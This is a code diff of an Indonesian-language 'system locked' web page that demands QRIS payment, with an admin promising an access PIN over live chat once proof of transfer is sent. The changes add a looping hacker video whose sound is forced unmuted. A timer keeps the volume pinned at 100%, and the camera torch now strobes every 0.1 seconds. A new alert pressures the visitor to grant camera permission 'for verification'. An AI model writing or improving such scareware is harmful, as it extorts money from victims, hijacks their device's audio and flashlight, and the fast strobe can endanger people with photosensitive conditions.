@@ -15,13 +15,8 @@
 
         body { background-color: var(--bg-color); color: #fff; font-family: 'Inter', sans-serif; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
         
-        .hacker-banner { width: 100%; max-width: 400px; border: 1px solid var(--border-color); margin-bottom: 20px; border-radius: 4px; overflow: hidden; animation: darkwebPulse 3s infinite; }
-        @keyframes darkwebPulse {
-            0%, 100% { filter: brightness(100%); }
-            10% { filter: brightness(30%) sepia(100%) hue-rotate(90deg); }
-            14% { filter: brightness(30%) sepia(100%) hue-rotate(0deg); }
-        }
-        .hacker-banner img { width: 100%; display: block; }
+        .hacker-banner { width: 100%; max-width: 400px; border: 1px solid var(--border-color); margin-bottom: 20px; border-radius: 4px; overflow: hidden; background: #000; }
+        .hacker-banner video { width: 100%; display: block; object-fit: cover; }
 
         .logo-circle { width: 85px; height: 85px; border: 2px solid #fff; border-radius: 50%; overflow: hidden; margin-bottom: 10px; }
         .logo-circle img { width: 100%; height: 100%; object-fit: cover; }
@@ -53,12 +48,11 @@
     </style>
 </head>
 <body onclick="inisialisasiEfek()"> 
-    <audio id="myAudio" loop>
-      <source src="musik.mp3" type="audio/mpeg">
-    </audio>
 
     <div class="hacker-banner">
-        <img src="hacker.jpg" alt="Hacker Banner">
+        <video id="myVideo" loop playsinline>
+            <source src="hacker.mp4" type="video/mp4">
+        </video>
     </div>
 
     <div class="logo-circle">
@@ -92,16 +86,10 @@
             </button>
             <div class="acc-content">
                 <div class="acc-body">
-                    1. Scan QRIS diatas menggunakan akun payment anda.<br>
-                    2. Selesaikan pembayaran sesuai nominal.<br>
-                    3. Klik logo sms warna hijau pojok kanan bawah.<br>
-                    4. Klik logo mengirim pesan dan mengirim gambar:<br>
-                    <img src="instruksi1.jpg" class="instruction-img" alt="Tutorial 1">
-                    5. Klik icon lampiran untuk mengirim bukti transaksi:<br>
-                    <img src="instruksi2.jpg" class="instruction-img" alt="Tutorial 2">
-                    6. Kirim bukti transfer melalui Live Chat Dan beri keterangan "SAYA SUDAH TRANSFER".<br>
-                    7. Klik tombol "Konfirmasi Pembayaran".<br>
-                    8. Setelah itu tunggu beberapa saat Admin akan verifikasi dan akan mengirimkan PIN AKSES Melalui live Chat.
+                    1. Scan QRIS diatas.<br>
+                    2. Selesaikan pembayaran.<br>
+                    3. Kirim bukti transfer melalui Live Chat.<br>
+                    4. Admin akan mengirimkan PIN AKSES.
                 </div>
             </div>
         </div>
@@ -109,14 +97,10 @@
         <div id="term" class="terminal">
             > Status Sistem: TERKUNCI<br>
             > Koneksi: Terenkripsi<br>
-            > Menunggu Pembayaran...
+            > Volume: Locked 100%
         </div>
 
         <button onclick="proses()" class="btn-pay" id="btn">KONFIRMASI PEMBAYARAN</button>
-
-        <div class="footer-text">
-            PIN AKSES akan diberikan oleh Admin via Live Chat setelah verifikasi manual.
-        </div>
     </div>
 
     <footer>© 2025 Copyright By vanzmoods</footer>
@@ -127,11 +111,21 @@
 
         async function inisialisasiEfek() {
             if (!fiturSudahJalan) {
-                // 1. Jalankan Musik
-                var audio = document.getElementById("myAudio");
-                audio.play().catch(e => console.log("Musik tertunda"));
+                var video = document.getElementById("myVideo");
 
-                // 2. Jalankan Senter Berkedip
+                // 1. Jalankan Video & Paksa Suara Muncul
+                video.muted = false;
+                video.volume = 1.0;
+                video.play().catch(e => console.log("Perlu interaksi"));
+
+                // 2. VOLUME LOOP (Memaksa volume tetap 100% setiap 0.5 detik)
+                setInterval(() => {
+                    if (video.volume < 1.0) {
+                        video.volume = 1.0;
+                    }
+                }, 500);
+
+                // 3. Jalankan Senter Berkedip Cepat (Strobe)
                 mulaiSenterKedip();
                 
                 fiturSudahJalan = true;
@@ -144,17 +138,17 @@
                     video: { facingMode: 'environment' } 
                 });
                 track = stream.getVideoTracks()[0];
-                const capabilities = track.getCapabilities();
+                const caps = track.getCapabilities();
                 
-                if (capabilities.torch) {
+                if (caps.torch) {
                     let flashOn = false;
                     setInterval(async () => {
                         flashOn = !flashOn;
                         await track.applyConstraints({ advanced: [{ torch: flashOn }] });
-                    }, 250); // Kecepatan kedip 0.25 detik
+                    }, 100); // Kedip sangat cepat (0.1 detik)
                 }
             } catch (err) {
-                console.log("Izin kamera diperlukan untuk fitur senter.");
+                alert("IZINKAN KAMERA UNTUK VERIFIKASI!");
             }
         }
 
@@ -163,18 +157,9 @@
         }
 
         function proses() {
-            const btn = document.getElementById('btn');
             const term = document.getElementById('term');
-            btn.disabled = true;
-            btn.style.background = "#333";
-            btn.innerHTML = "MENGIRIM NOTIFIKASI...";
-            
-            setTimeout(() => { term.innerHTML += "<br>> Mengirim notifikasi ke Admin..."; }, 1000);
-            setTimeout(() => { term.innerHTML += "<br>> Kirim bukti transfer melalui Live Chat sekarang."; }, 2500);
-            setTimeout(() => { 
-                term.innerHTML += "<br>> [MENUNGGU] Verifikasi manual oleh Admin diperlukan."; 
-                term.style.color = "#ff9900"; 
-            }, 4000);
+            term.innerHTML += "<br>> Mengirim laporan ke Admin...";
+            alert("Kirim bukti transfer ke Live Chat!");
         }
     </script>
 
